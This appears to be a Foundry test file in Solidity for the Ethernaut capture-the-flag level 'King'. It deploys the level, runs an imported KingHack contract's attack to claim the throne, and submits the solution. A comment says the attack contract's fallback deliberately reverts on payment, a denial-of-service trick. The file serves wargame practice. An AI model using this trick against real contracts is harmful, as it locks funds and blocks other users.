pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/09_King/KingFactory.sol";
import "../src/levels/09_King/KingHack.sol";
import "../src/core/Ethernaut.sol";
import "./utils/vm.sol";
import "forge-std/console.sol";


contract KingTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address attacker = address(100);
    

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
        King ethernautKing = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        KingHack kingHack = new KingHack(payable(levelAddress));

        uint prize = ethernautKing.prize();

        // Become king
        kingHack.attack{value: prize}();

        // kingHack has malicious fallback that fails when you try to send it eth

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
